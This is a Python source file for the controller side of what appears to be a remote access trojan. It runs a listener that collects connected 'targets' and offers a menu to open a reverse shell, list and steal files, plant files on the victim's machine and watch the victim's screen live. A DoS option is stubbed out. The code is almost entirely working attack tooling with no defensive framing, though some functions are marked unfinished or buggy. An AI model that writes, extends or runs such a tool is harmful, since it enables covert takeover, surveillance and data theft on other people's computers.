import socket
from threading import Thread
import time
from vidstream import StreamingServer
import os
from getpass import getuser

IPADDR = ''#enter your private ip address
PORT = 9999
conns = []
addrs = []


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((IPADDR, PORT))
s.listen(5)
print("|--- LISTENTING FOR CLIENTS ---|\n\n")



def  reverse_shell(conn):# delayed but working
    print("|--- CONNECTING TO HOST'S SHELL ---|\n")
    while True:
        cmd = input()
        if cmd == 'quit':
            print('|- EXITING REVERSE SHELL... -|')
            input("Press enter to return to main: ")
            custom_shell()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            clientresponse = str(conn.recv(2048), 'utf-8')
            print(clientresponse, end='')
            
            
def dos():
    pass


def listfiles(conn):
    print("|--- GATHERING FILES ---|")
    msg = r"//////LISTFILES//////"
    conn.send(str.encode(msg))
    while  '+++++++++++++++++++++++++++++++++++++++++++++++++++++++++' not in str(conn.recv(2048), 'utf-8'):
        response = str(conn.recv(2048), 'utf-8')
        print(response)
    print('+++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n                       |- DONE -|\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++')
    input('Press enter to return to main page: ')
    custom_shell()


def sendfile(conn):#not 100%
    print('|--- STARTING FILE TRANSFER ---|')
    msg = r'//////SENDFILE//////'
    conn.send(str.encode(msg))
    
    filepath = input("|--- WARNING ---| Make sure the file does not \n\
already exist on the host's machine! Or else it may not work and can \n\
potentially close the connection. \nENTER FILEPATH: ")
    conn.send(str.encode(filepath))
    with open(filepath, 'rb') as f:
        contents = f.read()
    filesize = str(os.path.getsize(filepath))
    conn.send(str.encode(filesize))
    time.sleep(1)
    conn.sendall(contents)
    print('\n|- WORKING... -| Download times may vary depending on file size.')

    print("When completed, the file can be found in C:/Users/___/User Boot on the host's machine")
    input('Press enter to return to main page: ')
    custom_shell()



def viewscreen(conn):
    print("|--- CONNECTING TO HOST'S SCREEN ---|")
    msg = r"//////STREAMDISPLAY//////"
    conn.send(str.encode(msg))
    r = StreamingServer(IPADDR, 1235)
    t = Thread(target=r.start_server)
    t.start()
    while input("Press 'q' to exit Screen Share\n\n") != 'q':
        continue
    print("|--- STOPPING STREAM ... ---|")
    r.stop_server()
    input('Press enter to return to main page: ')
    custom_shell()


def getfile(conn):#not working
    msg = r"//////GETFILE//////"
    conn.send(str.encode(msg))#a
    print("|- STARTING FILE TRANSFER -|")
    filepath = input("Enter file path of desired file: ")
    conn.send(str.encode(filepath))#b
    size = int(conn.recv(1024).decode('utf-8'))
    completed = b''
    dirpath = f"C:\\Users\\{getuser()}\\Desktop"

    if os.path.exists(dirpath):
        pass
    else:
        os.mkdir(dirpath)

    head, tail = os.path.split(filepath)
    with open(f"{dirpath}\\{tail}", 'wb') as f:
        while size != len(completed):
            contents = conn.recv(2048)
            completed += contents
        f.write(contents)
    print("File transfer completed")
    input('Press enter to return to main page: ')
    custom_shell()
    


def list_options(conn, addr):
    print(f"""|-----Actions to perform on {addr[0]}-----|\n 
|- 1 -| - Reverse shell
|- 2 -| - Dos attack
|- 3 -| - List files on machine
|- 4 -| - Send a file to host
|- 5 -| - View the host's screen
|- 6 -| - Retrieve a file from host
|- x -| - Go back to previous screen
    """)
    while True:    
        option = input(">>>")
        if option == "select 1":
            reverse_shell(conn)
        elif option == 'select 2':
            dos()
            custom_shell()
        elif option == 'select 3':
            listfiles(conn)
        elif option == 'select 4':
            sendfile(conn)
        elif option == 'select 5':
            viewscreen(conn)
        elif option == 'select 6':
            getfile(conn)
        elif option == 'select x' or option == 'x':
            custom_shell()
        else:
            print("|--- ERROR ---| unrecognized command. Try again.\n")
            continue

def list_conns():
    try:
        print("|----- ACTIVE CONNECTIONS -----|\n")
        for n, a in enumerate(addrs):
            print(F"|- {n} -| - {a}")
    except:
        ("|--- ERROR ---| There are no active connections")
    print('\n\n')


def select_host(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = conns[target]
        addr = addrs[target]
        conn.send(str.encode(' '))
    
            #print('|--- ERROR ---| Connection to host was closed')
        print("You are now connected to the target")
        return conn, addr
    except:
        print("|--- ERROR ---| Could not find your selected host. \nYou either entered an invalid target number or the \nconnection to this target was closed. \n\nReturning to main screen...")
        try:
            del conns[target]
            del addrs[target]
        except:
            pass
        custom_shell()

def custom_shell():
    print(r"""
       /==================================================== WELCOME TO ==================================================\
      /*//*/**********************************************************************************************************\*\\*\ 
     /*//*/                                                                                                            \*\\*\
     |*||*|     _____________          ____________    _____     ___    _____________    ___________  ______________   |*||*|
     |*||*|    / r---------\ \        / /a------/ /   /n---|    /  /   /g--_______  /   /e-________/ / r _________\ \  |*||*| 
     |*||*|   / /    | |    / /      / /       / /   /  /| |   /  /   /  /       / /   /  /         / /    | |    / /  |*||*|
     |*||*|  / /     | ----/ /      / /______ / /   /  / | |  /  /   /  /       /_/   /  /__       / /     | ----/ /   |*||*|
     |*||*|         / /---| |      / /______ / /   /  /  | | /  /   /  /   ______    /  ___/              / /   | |    |*||*|
     |*||*|        / /     \ \    / /       / /   /  /   | |/  /   /  /   /     /   /  /                 / /     \ \   |*||*|
     |*||*|       / /       | |  / /       / /   /  /    |    /   /  /_______/ /   /  /_____            / /       | |  |*||*|               
     |*||*|      /_/       /_/  /_/       /_/   /__/     |__ /   /____________/   /__________/         /_/       /_/   |*||*|

                                                    ____________
                                                    \i--------i/
                                                    /----------\_______________________________
                                    ===============/  ___       /_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/______,,,,
                                    |         /====/  /_>_/| || |\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\      ````
                                    |    /===/    /  /     | || |
                                    |===/        /__/       \ \\ \
                                                             \___/
    
    """)
    while True:
        cmd = input(">>>")
        if cmd == 'list':

            list_conns()
        elif 'select' in cmd:
            conn, addr = select_host(cmd)
        elif cmd == "options":
            #try:
            list_options(conn, addr)
        #    except:
         #       print("Please select a target to attack.\n")
                #continue
        elif cmd == 'help':
            print("""|-------------------- COMMANDS ---------------------|
|- 'list' -| - List all machines to connect to
|- 'select' - | - Select a machine to perform actions on
|- 'options' -| - List all actions to perfrom on specified machine\n\n""")
        elif cmd == 'quit' or cmd == "exit":
            quit()
        else:
            print("|--- ERROR ---| Unrecognized command. Try again or type 'help' for help.")
            continue




def accept_socket():
    for c in conns:
        c.close()
    del conns[:]
    del addrs[:]
    while True:
        try:
            conn, addr = s.accept()
            conn.setblocking(1)
            conns.append(conn)
            addrs.append(addr)
            print(f'\n\n|--- NEW CONNECTION ESTABLISHED ---| : {addr}\n\n>>>', end='')
            
        except:
            print("\n\n|--- ERROR ---| could not accept a connection.\n\n")
            continue
thread = Thread(target=accept_socket, daemon=1)
thread2 = Thread(target=custom_shell, daemon=0)
thread2.start()
thread.start()
